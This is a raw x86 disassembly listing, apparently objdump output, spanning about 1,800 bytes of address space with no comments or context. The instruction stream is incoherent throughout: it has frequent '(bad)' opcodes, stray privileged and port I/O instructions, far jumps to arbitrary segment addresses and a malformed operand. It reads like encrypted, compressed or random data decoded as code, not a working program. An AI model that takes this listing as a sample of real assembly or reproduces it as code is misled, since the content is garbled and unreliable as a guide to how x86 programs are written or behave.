  6ae430:	imul   esi,ebp,0xa02a6799
  6ae436:	push   edx
  6ae437:	jmp    0x6ae4b4
  6ae439:	gs (bad) 
  6ae43b:	mul    DWORD PTR [esi+0x51]
  6ae43e:	lock mov ebx,eax
  6ae441:	repz adc BYTE PTR [edx-0x5596dd6],ah
  6ae448:	push   cs
  6ae449:	mov    BYTE PTR [ecx],ah
  6ae44b:	push   edi
  6ae44c:	outs   dx,BYTE PTR ds:[esi]
  6ae44d:	jae    0x6ae445
  6ae44f:	scas   al,BYTE PTR es:[edi]
  6ae450:	nop
  6ae451:	sub    DWORD PTR [esi],esi
  6ae453:	addr16 mov eax,ds:0x5f31
  6ae457:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ae458:	xor    eax,0x6a26eaa2
  6ae45d:	mov    cl,0x51
  6ae45f:	sahf   
  6ae460:	mov    BYTE PTR [edi],al
  6ae462:	adc    DWORD PTR [edi+0x1f],esi
  6ae465:	cmp    eax,0x58b99296
  6ae46a:	sub    BYTE PTR [ebx+eiz*8+0x29593439],al
  6ae471:	test   ebp,eax
  6ae473:	mov    ah,BYTE PTR [edi+ecx*4-0x5c]
  6ae477:	push   0x51f477f8
  6ae47c:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  6ae47e:	add    eax,DWORD PTR [ebx+0x39193878]
  6ae484:	retf   0x9526
  6ae487:	dec    ebp
  6ae488:	sbb    DWORD PTR [ecx],0x3cfbc595
  6ae48e:	cmp    ah,BYTE PTR [edx+0x76]
  6ae491:	dec    esp
  6ae492:	fidiv  WORD PTR [ebp+0x168bfab0]
  6ae498:	fcomp  QWORD PTR [ecx+0x15ff9cef]
  6ae49e:	sub    ebp,esp
  6ae4a0:	mov    ah,0x83
  6ae4a2:	aam    0x2b
  6ae4a4:	shl    BYTE PTR [esi],0x68
  6ae4a7:	sub    eax,0x123dd343
  6ae4ac:	add    DWORD PTR [ebp+0xf],0x47
  6ae4b0:	mov    cl,0x74
  6ae4b2:	mov    BYTE PTR [ebx-0x6f618f7a],ah
  6ae4b8:	ins    BYTE PTR es:[edi],dx
  6ae4b9:	jnp    0x6ae52e
  6ae4bb:	sub    dh,0x28
  6ae4be:	not    ebx
  6ae4c0:	sub    BYTE PTR [edi],dh
  6ae4c2:	jns    0x6ae445
  6ae4c4:	and    al,0x55
  6ae4c6:	sbb    al,0x87
  6ae4c8:	pushf  
  6ae4c9:	add    eax,0xd57c57f6
  6ae4ce:	mov    ebp,0x4d81e08
  6ae4d3:	fs cs pop es
  6ae4d6:	and    al,0x2a
  6ae4d8:	sahf   
  6ae4d9:	jmp    0xc5758034
  6ae4de:	call   0x47246ce
  6ae4e3:	stos   BYTE PTR es:[edi],al
  6ae4e4:	loopne 0x6ae4aa
  6ae4e6:	adc    eax,0x24ebfcf5
  6ae4eb:	add    ah,bh
  6ae4ed:	or     eax,0x91c097ac
  6ae4f2:	sub    ch,BYTE PTR [ebp+0x26a3fede]
  6ae4f8:	fs out 0x48,eax
  6ae4fb:	xchg   esi,eax
  6ae4fc:	std    
  6ae4fd:	loope  0x6ae53a
  6ae4ff:	and    ebx,DWORD PTR [ebp+ecx*8-0x1dd88846]
  6ae506:	jge    0x6ae56b
  6ae508:	xchg   DWORD PTR [edx-0x49],edx
  6ae50b:	clc    
  6ae50c:	push   esp
  6ae50d:	push   eax
  6ae50e:	adc    dh,BYTE PTR [edx+0xe]
  6ae511:	jl     0x6ae516
  6ae513:	ret    0x85dd
  6ae516:	sub    bl,bh
  6ae518:	push   ebp
  6ae519:	aas    
  6ae51a:	jo     0x6ae554
  6ae51c:	daa    
  6ae51d:	repz fs push ebx
  6ae520:	add    bl,cl
  6ae522:	hlt    
  6ae523:	out    0x2b,eax
  6ae525:	mov    ebp,fs
  6ae527:	add    BYTE PTR [eax+0x58775fa3],dh
  6ae52d:	mov    dl,0xec
  6ae52f:	jle    0x6ae4bd
  6ae531:	mov    edx,0xd065c4f5
  6ae536:	jnp    0x6ae544
  6ae538:	sahf   
  6ae539:	jg     0x6ae576
  6ae53b:	sub    BYTE PTR [ecx-0x3],cl
  6ae53e:	and    dh,BYTE PTR [eax+eiz*8+0x21]
  6ae542:	sbb    BYTE PTR es:[ecx],dh
  6ae545:	mov    WORD PTR [ecx-0x7d],cs
  6ae548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ae549:	push   esi
  6ae54a:	shl    BYTE PTR [esi+ecx*4+0xac40581],cl
  6ae551:	mov    edi,0xc239e885
  6ae556:	dec    eax
  6ae557:	sub    ebx,ecx
  6ae559:	push   cs
  6ae55a:	xor    DWORD PTR [ebx+0x1e],edx
  6ae55d:	js     0x6ae575
  6ae55f:	mov    ds:0x319c3c6a,al
  6ae564:	push   ecx
  6ae565:	xchg   esi,eax
  6ae566:	(bad)  
  6ae567:	hlt    
  6ae568:	cdq    
  6ae569:	pop    ds
  6ae56a:	and    al,0x40
  6ae56c:	jb     0x6ae56a
  6ae56e:	mov    ebp,0xdf78df9c
  6ae573:	daa    
  6ae574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ae575:	inc    esi
  6ae576:	das    
  6ae577:	mov    edi,0xac2047a2
  6ae57c:	xchg   edx,eax
  6ae57d:	(bad)  
  6ae57e:	push   0x6312a054
  6ae583:	into   
  6ae584:	loope  0x6ae56b
  6ae586:	jne    0x6ae5a4
  6ae588:	pop    es
  6ae589:	and    dl,BYTE PTR [ecx]
  6ae58b:	ss push es
  6ae58d:	fistp  QWORD PTR ds:0x2b42478b
  6ae593:	sar    BYTE PTR [ebp+0x62499419],1
  6ae599:	adc    BYTE PTR [ebp+0x8de6068],dl
  6ae59f:	call   0x6b53:0x2551a849
  6ae5a6:	or     cl,BYTE PTR ds:0x4423f686
  6ae5ac:	jle    0x6ae5ee
  6ae5ae:	out    0x8c,al
  6ae5b0:	xlat   BYTE PTR ds:[ebx]
  6ae5b1:	fcmovnb st,st(6)
  6ae5b3:	pushf  
  6ae5b4:	leave  
  6ae5b5:	shl    DWORD PTR ds:0xb2d2751b,1
  6ae5bb:	push   es
  6ae5bc:	add    al,0xb5
  6ae5be:	outs   dx,BYTE PTR ds:[esi]
  6ae5bf:	mov    bh,0x8b
  6ae5c1:	ss in  eax,0x8
  6ae5c4:	inc    ecx
  6ae5c5:	outs   dx,DWORD PTR ds:[esi]
  6ae5c6:	push   ebx
  6ae5c7:	es jmp 0xd331:0x32ebaadb
  6ae5cf:	call   eax
  6ae5d1:	mov    dh,0xd8
  6ae5d3:	inc    edx
  6ae5d4:	js     0x6ae55f
  6ae5d6:	and    ebp,DWORD PTR [ecx+0xde555a0]
  6ae5dc:	in     al,dx
  6ae5dd:	jo     0x6ae5eb
  6ae5df:	rcr    DWORD PTR [esi-0x66d90fd3],1
  6ae5e5:	ja     0x6ae5af
  6ae5e7:	scas   eax,DWORD PTR es:[edi]
  6ae5e8:	shr    DWORD PTR ds:0x1100ed98,1
  6ae5ee:	(bad)  
  6ae5f0:	pop    edx
  6ae5f1:	stos   DWORD PTR es:[edi],eax
  6ae5f2:	sti    
  6ae5f3:	fcomp  QWORD PTR [eax+edx*1+0x51a8db22]
  6ae5fa:	push   es
  6ae5fb:	push   DWORD PTR [ebp+eiz*1+0x6737537d]
  6ae602:	imul   edx,ebp,0x42
  6ae605:	repnz inc ebp
  6ae607:	push   ss
  6ae608:	imul   esi,DWORD PTR [edx-0x6c],0x12470016
  6ae60f:	mov    dl,0xb0
  6ae611:	and    bh,bl
  6ae613:	jne    0x6ae5a0
  6ae615:	adc    DWORD PTR [eax],0x8080bde1
  6ae61b:	aas    
  6ae61c:	or     cl,BYTE PTR [eax-0x6]
  6ae61f:	xchg   esi,eax
  6ae620:	mov    ch,0x88
  6ae622:	and    eax,0x26d79e45
  6ae627:	mov    dh,0xe4
  6ae629:	push   ebx
  6ae62a:	adc    BYTE PTR [ebp+0x2f],al
  6ae62d:	jl     0x6ae604
  6ae62f:	and    al,0x77
  6ae631:	inc    edi
  6ae632:	lock dec edx
  6ae634:	aam    0xe3
  6ae636:	push   esp
  6ae637:	or     al,0x96
  6ae639:	cmc    
  6ae63a:	cmp    al,0x8a
  6ae63c:	div    BYTE PTR [ecx+ebp*2+0x2e5b3f36]
  6ae643:	jo     0x6ae604
  6ae645:	cmp    edx,eax
  6ae647:	cmp    bl,cl
  6ae649:	cwde   
  6ae64a:	xchg   edx,eax
  6ae64b:	pop    ebx
  6ae64c:	mov    ebx,0x4980c766
  6ae651:	mov    ch,0xd4
  6ae653:	retf   0x2738
  6ae656:	mov    esi,0xd20e134f
  6ae65b:	push   ebx
  6ae65c:	fcom   QWORD PTR [edi]
  6ae65e:	std    
  6ae65f:	iret   
  6ae660:	jne    0x6ae651
  6ae662:	sub    eax,0x8b782ab3
  6ae667:	push   fs
  6ae669:	jne    0x6ae631
  6ae66b:	mov    gs,WORD PTR [eax+edi*8]
  6ae66e:	or     eax,0x824feda3
  6ae673:	xchg   edi,eax
  6ae674:	dec    ebp
  6ae675:	add    al,cl
  6ae677:	ss shr al,0xaf
  6ae67b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ae67c:	cmp    DWORD PTR [eax-0x1b2dabc1],0xffffffe6
  6ae683:	dec    edi
  6ae684:	jecxz  0x6ae655
  6ae686:	jmp    0xb0f:0xdd135598
  6ae68d:	jle    0x6ae6ce
  6ae68f:	jg     0x6ae638
  6ae691:	dec    ebp
  6ae692:	mov    edx,0x181de1fe
  6ae697:	outs   dx,DWORD PTR ds:[esi]
  6ae698:	mov    ds,WORD PTR [edx]
  6ae69a:	push   esi
  6ae69b:	add    edi,ebx
  6ae69d:	mov    WORD PTR [ecx+0xc],ss
  6ae6a0:	sbb    DWORD PTR [eax+0x41961182],edi
  6ae6a6:	pop    esi
  6ae6a7:	or     ecx,DWORD PTR [edx-0x11]
  6ae6aa:	xor    BYTE PTR [ecx],cl
  6ae6ac:	int    0x98
  6ae6ae:	sub    al,0x2
  6ae6b0:	fdiv   st(4),st
  6ae6b2:	jp     0x6ae6d0
  6ae6b4:	das    
  6ae6b5:	and    DWORD PTR [ebx+0x5e676838],0xffffffb3
  6ae6bc:	dec    esp
  6ae6bd:	fucomp st(7)
  6ae6bf:	repnz mov dl,0x57
  6ae6c2:	dec    bh
  6ae6c4:	jae    0x6ae651
  6ae6c6:	lods   eax,DWORD PTR ds:[esi]
  6ae6c7:	cwde   
  6ae6c8:	cmove  ecx,ebp
  6ae6cb:	inc    eax
  6ae6cc:	loope  0x6ae6f7
  6ae6ce:	pop    edx
  6ae6cf:	push   ss
  6ae6d0:	mov    cl,0x1a
  6ae6d2:	(bad)  
  6ae6d3:	ficom  DWORD PTR [eax+0xe7e0065]
  6ae6d9:	xor    eax,0x4d8c3682
  6ae6de:	xchg   edi,eax
  6ae6df:	xor    al,cl
  6ae6e1:	iret   
  6ae6e2:	int    0xf
  6ae6e4:	push   ecx
  6ae6e5:	mov    al,0xb
  6ae6e7:	pop    esi
  6ae6e8:	fisub  DWORD PTR [edx+0x3c]
  6ae6eb:	loop   0x6ae6ed
  6ae6ed:	(bad)  
  6ae6ee:	je     0x6ae6aa
  6ae6f0:	(bad)  
  6ae6f1:	mov    dl,0x4e
  6ae6f3:	xchg   edx,eax
  6ae6f4:	adc    al,0xc5
  6ae6f6:	test   BYTE PTR [eax+esi*1],ah
  6ae6f9:	lods   eax,DWORD PTR ds:[esi]
  6ae6fa:	and    bh,BYTE PTR [esi-0x77]
  6ae6fd:	bound  esp,QWORD PTR [eax+0x3a134d02]
  6ae703:	push   ecx
  6ae704:	pop    ebx
  6ae705:	mov    ecx,0xbad02532
  6ae70a:	popf   
  6ae70b:	iret   
  6ae70c:	xchg   esi,eax
  6ae70d:	or     BYTE PTR [ebx+ebp*1-0x77],ch
  6ae711:	scas   eax,DWORD PTR es:[edi]
  6ae712:	jecxz  0x6ae6d8
  6ae714:	lds    ebx,FWORD PTR [edi-0x6]
  6ae717:	daa    
  6ae718:	scas   al,BYTE PTR es:[edi]
  6ae719:	xchg   ebx,eax
  6ae71a:	(bad)  
  6ae71b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ae71c:	sub    BYTE PTR [eax],ah
  6ae71e:	sahf   
  6ae71f:	add    al,0xc2
  6ae721:	dec    edi
  6ae722:	jae    0x6ae788
  6ae724:	arpl   bx,bx
  6ae726:	push   edi
  6ae727:	ds or  eax,0x64116ded
  6ae72d:	sub    al,0xc4
  6ae72f:	cld    
  6ae730:	jp     0x6ae783
  6ae732:	or     DWORD PTR [ebx],esi
  6ae734:	das    
  6ae735:	call   0x5e37:0xcf5374d3
  6ae73c:	cmp    al,0xba
  6ae73e:	pop    ebx
  6ae73f:	cmp    DWORD PTR [eax+0x22],esi
  6ae742:	xchg   ebp,eax
  6ae743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ae744:	sub    BYTE PTR [ecx+0x7a22e92e],bl
  6ae74a:	inc    edx
  6ae74b:	test   eax,0xe10ccd93
  6ae750:	stc    
  6ae751:	inc    esi
  6ae752:	inc    ebp
  6ae753:	and    al,0xdc
  6ae755:	loope  0x6ae73c
  6ae757:	pop    ds
  6ae758:	mov    dh,bh
  6ae75a:	mov    ch,0xb4
  6ae75c:	fidiv  WORD PTR ds:0x4fb17183
  6ae762:	test   eax,0x638034c5
  6ae767:	mov    edx,0x6b196a6d
  6ae76c:	nop
  6ae76d:	sub    DWORD PTR [esi+0x6f],edx
  6ae770:	jg     0x6ae7db
  6ae772:	dec    esi
  6ae773:	pusha  
  6ae774:	inc    eax
  6ae775:	fwait
  6ae776:	jbe    0x6ae770
  6ae778:	pop    ds
  6ae779:	adc    DWORD PTR [edx-0x5d],0x1c256bad
  6ae780:	das    
  6ae781:	dec    edi
  6ae782:	xor    DWORD PTR [edx+0x99d2656],ebx
  6ae788:	scas   al,BYTE PTR es:[edi]
  6ae789:	cmp    edx,DWORD PTR [ecx+0x8]
  6ae78c:	sub    BYTE PTR [ebx],bh
  6ae78e:	xchg   ebx,eax
  6ae78f:	iret   
  6ae790:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ae791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ae792:	pop    ss
  6ae793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ae794:	in     al,0xc8
  6ae796:	jns    0x6ae7e6
  6ae798:	retf   0xa00e
  6ae79b:	sbb    bh,BYTE PTR [edx+0x20]
  6ae79e:	adc    BYTE PTR [ecx+0x364b1ab3],bl
  6ae7a4:	sbb    eax,DWORD PTR [edx]
  6ae7a6:	loopne 0x6ae7b2
  6ae7a8:	xchg   ebx,eax
  6ae7a9:	enter  0x941f,0x7f
  6ae7ad:	daa    
  6ae7ae:	add    esi,DWORD PTR [eax]
  6ae7b0:	add    DWORD PTR [edx],edx
  6ae7b2:	adc    al,0x77
  6ae7b4:	xchg   esp,eax
  6ae7b5:	mov    WORD PTR [ecx-0x744e34],gs
  6ae7bb:	xchg   ecx,eax
  6ae7bc:	test   BYTE PTR [esi+0x45],cl
  6ae7bf:	jb     0x6ae818
  6ae7c1:	call   0x2cf89d22
  6ae7c6:	cmp    al,0x22
  6ae7c8:	and    ecx,0x7
  6ae7cb:	dec    edi
  6ae7cc:	mov    ah,0xb1
  6ae7ce:	sbb    DWORD PTR [eax-0x59],ebx
  6ae7d1:	outs   dx,DWORD PTR ds:[esi]
  6ae7d2:	daa    
  6ae7d3:	push   esi
  6ae7d4:	lods   al,BYTE PTR ds:[esi]
  6ae7d5:	popa   
  6ae7d6:	cmp    eax,0x5c96dc2b
  6ae7db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ae7dc:	lock xchg ebp,eax
  6ae7de:	push   edi
  6ae7df:	sar    DWORD PTR ds:0x4d6d4cab,1
  6ae7e5:	int3   
  6ae7e6:	popa   
  6ae7e7:	dec    ecx
  6ae7e8:	stc    
  6ae7e9:	scas   eax,DWORD PTR es:[edi]
  6ae7ea:	sbb    ebp,DWORD PTR ds:0x59480b7f
  6ae7f0:	lock mov DWORD PTR [esp+edi*8],0xddc749c1
  6ae7f8:	mov    cs,WORD PTR [edi*2+0x485a8926]
  6ae7ff:	inc    esi
  6ae800:	cld    
  6ae801:	xor    al,0xf3
  6ae803:	mov    ds,WORD PTR [ebx-0x164d8cc8]
  6ae809:	push   ss
  6ae80a:	lea    eax,ss:[esi+0x22]
  6ae80e:	push   ds
  6ae80f:	cli    
  6ae810:	jmp    0xe3ab:0x2746d0b2
  6ae817:	mov    ds:0x6b2b6b99,eax
  6ae81c:	jl     0x6ae7de
  6ae81e:	fst    DWORD PTR [edx-0x5b8c1ba5]
  6ae824:	push   esp
  6ae825:	pushf  
  6ae826:	test   eax,0x8e26af08
  6ae82b:	mov    ebx,0x10e51901
  6ae830:	add    eax,0x253a28d
  6ae835:	jno    0x6ae87e
  6ae837:	outs   dx,BYTE PTR ds:[esi]
  6ae838:	jae    0x6ae7fb
  6ae83a:	and    edx,DWORD PTR [edi+edx*8-0x6aa7f7d9]
  6ae841:	push   es
  6ae842:	push   ecx
  6ae843:	jmp    0x174c9d3e
  6ae848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ae849:	mov    ebp,0xece981cf
  6ae84e:	xchg   DWORD PTR [esi+eiz*4-0xf],esi
  6ae852:	lods   al,BYTE PTR ds:[esi]
  6ae853:	jbe    0x6ae8ad
  6ae855:	dec    eax
  6ae856:	inc    edi
  6ae857:	or     BYTE PTR [edi+0xb],dh
  6ae85a:	pop    ss
  6ae85b:	xor    al,0xc9
  6ae85d:	jno    0x6ae8a4
  6ae85f:	arpl   WORD PTR [eax-0x7c],bx
  6ae862:	stos   BYTE PTR es:[edi],al
  6ae863:	pusha  
  6ae864:	jno    0x6ae826
  6ae866:	mov    eax,0xf62b5d20
  6ae86b:	mov    al,0x55
  6ae86d:	pop    esp
  6ae86e:	mov    DWORD PTR [ebp-0x520433fd],ebx
  6ae874:	aas    
  6ae875:	dec    eax
  6ae876:	jecxz  0x6ae855
  6ae878:	test   bl,cl
  6ae87a:	pop    edi
  6ae87b:	lock cs xor eax,0x786065eb
  6ae882:	cwde   
  6ae883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ae884:	pop    es
  6ae885:	stos   BYTE PTR es:[edi],al
  6ae886:	xlat   BYTE PTR ds:[ebx]
  6ae887:	ja     0x6ae8a7
  6ae889:	jge    0x6ae8e0
  6ae88b:	xor    al,0x7e
  6ae88d:	aaa    
  6ae88e:	lods   eax,DWORD PTR ds:[esi]
  6ae88f:	cmp    al,0x5d
  6ae891:	jno    0x6ae901
  6ae893:	sbb    al,0xac
  6ae895:	jge    0x6ae8d0
  6ae897:	sar    DWORD PTR es:0xf184296e,0xd1
  6ae89f:	cmc    
  6ae8a0:	out    dx,eax
  6ae8a1:	sub    ebx,ecx
  6ae8a3:	in     al,dx
  6ae8a4:	lea    ecx,fs:[ebx+0x5d25a1c7]
  6ae8ab:	idiv   BYTE PTR [ecx]
  6ae8ad:	adc    esi,esp
  6ae8af:	popa   
  6ae8b0:	or     ebx,eax
  6ae8b2:	pop    eax
  6ae8b3:	(bad)  
  6ae8b4:	pop    eax
  6ae8b5:	ret    
  6ae8b6:	or     dl,ch
  6ae8b8:	jns    0x6ae8d0
  6ae8ba:	jns    0x6ae85b
  6ae8bc:	nop
  6ae8bd:	jne    0x6ae86b
  6ae8bf:	iret   
  6ae8c0:	cwde   
  6ae8c1:	adc    esi,DWORD PTR [edx+ebp*1+0x386980b2]
  6ae8c8:	mov    BYTE PTR [esi],ch
  6ae8ca:	stos   DWORD PTR es:[edi],eax
  6ae8cb:	arpl   WORD PTR [ecx+eax*1+0x29e0cc18],dx
  6ae8d2:	adc    BYTE PTR [esi+eiz*4+0x73],bl
  6ae8d6:	push   ebp
  6ae8d7:	ds and ah,dl
  6ae8da:	bound  eax,QWORD PTR [eax]
  6ae8dc:	jmp    ecx
  6ae8de:	xor    eax,0xa1adb53e
  6ae8e3:	stos   DWORD PTR es:[edi],eax
  6ae8e4:	dec    ebx
  6ae8e5:	push   ss
  6ae8e6:	leave  
  6ae8e7:	pop    ebp
  6ae8e8:	cld    
  6ae8e9:	pop    esp
  6ae8ea:	mov    bl,0x7c
  6ae8ec:	push   edi
  6ae8ed:	jb     0x6ae8bf
  6ae8ef:	mov    edx,0x42e23734
  6ae8f4:	xor    al,0xbd
  6ae8f6:	iret   
  6ae8f7:	pop    esp
  6ae8f8:	mov    esi,0x32210275
  6ae8fd:	mov    ds:0xdeb58ce6,eax
  6ae902:	fmul   QWORD PTR [esi]
  6ae904:	cmp    BYTE PTR [edx-0x75],0xb1
  6ae908:	in     eax,0x9f
  6ae90a:	stos   BYTE PTR es:[edi],al
  6ae90b:	enter  0x3f5d,0x7c
  6ae90f:	popa   
  6ae910:	cmp    edi,DWORD PTR [edx+0x14c0fe21]
  6ae916:	sbb    ebp,0xf4076150
  6ae91c:	out    0x62,al
  6ae91e:	cmp    ah,dh
  6ae920:	cmc    
  6ae921:	lock mov DWORD PTR [eax],esi
  6ae924:	in     eax,0xc6
  6ae926:	int3   
  6ae927:	adc    al,0xf3
  6ae929:	movups xmm7,xmm7
  6ae92c:	loop   0x6ae8e5
  6ae92e:	add    al,0x63
  6ae930:	out    0x7f,al
  6ae932:	sub    esp,ebx
  6ae934:	loop   0x6ae8c9
  6ae936:	mov    dh,0x72
  6ae938:	adc    BYTE PTR [ecx+ebx*8-0x4e30b13e],bh
  6ae93f:	loopne 0x6ae8d6
  6ae941:	fs cmp ebx,ebx
  6ae944:	inc    ecx
  6ae945:	stc    
  6ae946:	out    0xaa,al
  6ae948:	test   BYTE PTR [eax-0x23],0xe4
  6ae94c:	adc    eax,0xcc8ef051
  6ae951:	out    dx,eax
  6ae952:	inc    ebx
  6ae953:	jns    0x6ae90c
  6ae955:	bound  esi,QWORD PTR [ecx+0x157411d1]
  6ae95b:	xor    esi,ebp
  6ae95d:	sub    eax,0x64724356
  6ae962:	clc    
  6ae963:	(bad)  
  6ae964:	dec    esp
  6ae965:	and    eax,0x92c7f1cf
  6ae96a:	test   BYTE PTR ds:0xf0a6ffff,dh
  6ae970:	jmp    0x3b3bc6dc
  6ae975:	mov    dl,dl
  6ae977:	hlt    
  6ae978:	add    al,0x60
  6ae97a:	mov    dh,0xbf
  6ae97c:	shr    BYTE PTR [edi+0x14],0xaa
  6ae980:	test   DWORD PTR [eax-0x57dc3a0e],0xffe38c94
  6ae98a:	(bad)  
  6ae98b:	jp     0x6ae9f7
  6ae98d:	stos   DWORD PTR es:[edi],eax
  6ae98e:	jo     0x6ae9e4
  6ae990:	pusha  
  6ae991:	add    al,0xea
  6ae993:	fimul  DWORD PTR [edx+0x512cc97a]
  6ae999:	clc    
  6ae99a:	mov    ecx,DWORD PTR [ecx+0x7a73863c]
  6ae9a0:	repz je 0x6aea0f
  6ae9a3:	xchg   edi,eax
  6ae9a4:	sbb    ebp,DWORD PTR [ebp+0x5b4b3c5f]
  6ae9aa:	push   edx
  6ae9ab:	mov    ecx,0x64adbc8b
  6ae9b0:	sbb    eax,0xc22bc5a9
  6ae9b5:	retf   0xda38
  6ae9b8:	pop    ds
  6ae9b9:	xor    eax,0xfbf46734
  6ae9be:	ret    
  6ae9bf:	je     0x6aea1c
  6ae9c1:	inc    eax
  6ae9c2:	mov    ah,0x7f
  6ae9c4:	rcr    DWORD PTR [ebp-0x4f],1
  6ae9c7:	cmp    BYTE PTR [esi-0x27f52e61],ah
  6ae9cd:	mov    eax,0x87c930fa
  6ae9d2:	xor    eax,0x132b0465
  6ae9d7:	aas    
  6ae9d8:	and    bh,dh
  6ae9da:	cvttps2pi mm7,QWORD PTR [edx+0x4d2ef8a1]
  6ae9e1:	jns    0x6ae99b
  6ae9e3:	inc    ebp
  6ae9e4:	or     ch,BYTE PTR [esi-0x16]
  6ae9e7:	and    BYTE PTR [ecx+edx*1],dl
  6ae9ea:	sbb    al,0x7c
  6ae9ec:	and    dh,BYTE PTR [edi-0x40b29d82]
  6ae9f2:	xor    esi,0xc5bdab2f
  6ae9f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ae9f9:	push   cs
  6ae9fa:	push   ecx
  6ae9fb:	xlat   BYTE PTR ds:[ebx]
  6ae9fc:	inc    edi
  6ae9fd:	cdq    
  6ae9fe:	push   ss
  6ae9ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6aea00:	pusha  
  6aea01:	cwde   
  6aea02:	popf   
  6aea03:	push   ebx
  6aea04:	aam    0x9
  6aea06:	je     0x6aea80
  6aea08:	(bad)  
  6aea09:	and    al,0xab
  6aea0b:	xchg   ecx,eax
  6aea0c:	dec    ebx
  6aea0d:	push   eax
  6aea0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6aea0f:	ficom  DWORD PTR [ebp-0x63]
  6aea12:	and    esi,ebp
  6aea14:	rcr    BYTE PTR [ecx+edx*4-0x18],1
  6aea18:	jo     0x6aea7f
  6aea1a:	je     0x6aea03
  6aea1c:	out    dx,al
  6aea1d:	push   ss
  6aea1e:	in     eax,dx
  6aea1f:	sbb    eax,0x5c406d30
  6aea24:	bound  eax,QWORD PTR [esi-0x79]
  6aea27:	jg     0x6aea13
  6aea29:	pop    ds
  6aea2a:	xchg   ebx,eax
  6aea2b:	fimul  DWORD PTR [edx-0x7f]
  6aea2e:	xchg   esi,eax
  6aea2f:	dec    ebp
  6aea30:	mov    ecx,0xaa384eff
  6aea35:	aaa    
  6aea36:	inc    ebp
  6aea37:	adc    ch,BYTE PTR [edx]
  6aea39:	addr16 aam 0xb
  6aea3c:	pusha  
  6aea3d:	fsub   QWORD PTR [ebx+0x2e9d66c6]
  6aea43:	xlat   BYTE PTR ds:[ebx]
  6aea44:	dec    esi
  6aea45:	cmp    ah,BYTE PTR [ecx+0x49]
  6aea48:	cmp    ebx,DWORD PTR [edx-0x605a04d0]
  6aea4e:	and    edi,ebx
  6aea50:	nop
  6aea51:	mov    ?,WORD PTR ds:0x760c06e2
  6aea57:	mov    esi,0xc7188215
  6aea5c:	mov    edx,0x522bf721
  6aea61:	inc    esi
  6aea62:	jns    0x6ae9ff
  6aea64:	xor    BYTE PTR [esp+edi*8],bl
  6aea67:	cmp    al,0x9d
  6aea69:	push   edi
  6aea6a:	enter  0xc399,0x46
  6aea6e:	xor    DWORD PTR [edi+ebx*8+0x65f4c4d6],ebx
  6aea75:	pop    eax
  6aea76:	push   esi
  6aea77:	ds call 0xa6f2f7a5
  6aea7d:	jge    0x6aea0c
  6aea7f:	jmp    0x3bd:0x800442c4
  6aea86:	xchg   esi,eax
  6aea87:	xchg   BYTE PTR es:[edi],bh
  6aea8a:	adc    cl,dh
  6aea8c:	pop    ebp
  6aea8d:	ret    0x197b
  6aea90:	retf   
  6aea91:	jb     0x6aea93
  6aea93:	inc    ebx
  6aea94:	daa    
  6aea95:	mov    esi,0x40f25403
  6aea9a:	gs inc eax
  6aea9c:	and    BYTE PTR [eax],ah
  6aea9e:	mov    eax,ds:0x41e4c753
  6aeaa3:	jl     0x6aea75
  6aeaa5:	repz lahf 
  6aeaa7:	mov    eax,ds:0x3f6d9433
  6aeaac:	cwde   
  6aeaad:	ja     0x6aea30
  6aeaaf:	fldenv [ebx+0x38bbfa25]
  6aeab5:	neg    esi
  6aeab7:	adc    al,0xa8
  6aeab9:	cdq    
  6aeaba:	dec    ecx
  6aeabb:	pop    ebp
  6aeabc:	mov    cl,0x79
  6aeabe:	clc    
  6aeabf:	mov    ecx,ebx
  6aeac1:	stc    
  6aeac2:	sbb    DWORD PTR [ebp+0x35],0xffffffe2
  6aeac6:	xor    cl,0xd1
  6aeac9:	sbb    ah,BYTE PTR [ecx]
  6aeacb:	adc    dh,BYTE PTR [ebx-0x558506f1]
  6aead1:	repnz push 0x4e39d3a0
  6aead7:	scas   eax,DWORD PTR es:[edi]
  6aead8:	pop    edi
  6aead9:	add    eax,0xdb3154b6
  6aeade:	mov    ch,0x70
  6aeae0:	clc    
  6aeae1:	jno    0x6aeb2e
  6aeae3:	cwde   
  6aeae4:	sub    al,0xaf
  6aeae6:	fs sub eax,0xf59271ae
  6aeaec:	loopne 0x6aea80
  6aeaee:	je     0x6aeb25
  6aeaf0:	mov    al,ds:0x5c124f00
  6aeaf5:	clc    
  6aeaf6:	jo     0x6aeaf5
  6aeaf8:	dec    edi
  6aeaf9:	adc    al,0xe7
  6aeafb:	outs   dx,BYTE PTR ds:[esi]
  6aeafc:	js     0x6aea7f
  6aeafe:	(bad)  
  6aeaff:	imul   edi,DWORD PTR [edx+0x347d219f],0xffffff84
  6aeb06:	dec    eax
  6aeb07:	or     ah,BYTE PTR [ecx-0x51798575]
  6aeb0d:	lahf   
  6aeb0e:	pop    ds
  6aeb0f:	(bad)  
  6aeb10:	xchg   ebp,eax
  6aeb11:	push   ecx
  6aeb12:	push   si
  6aeb14:	aas    
  6aeb15:	mov    bl,0x7f
  6aeb17:	loopne 0x6aeb4f
  6aeb19:	inc    ebx
  6aeb1a:	or     al,0x66
  6aeb1c:	sub    ch,BYTE PTR [esi+eax*1+0x7aadae30]
  6aeb23:	mov    cs,WORD PTR [ebx+0x13791730]
  6aeb29:	cld    
  6aeb2a:	jnp    0x6aeb61
  6aeb2c:	inc    edi
  6aeb2d:	ror    DWORD PTR [edi+0x26f052f3],0xd5
  6aeb34:	jo     0x6aeaef
  6aeb36:	adc    esi,DWORD PTR [ebx-0x2a793f70]
  6aeb3c:	daa    
  6aeb3d:	xchg   ebp,eax
  6aeb3e:	inc    ecx
  6aeb3f:	stc    
  6aeb40:	repnz in eax,dx
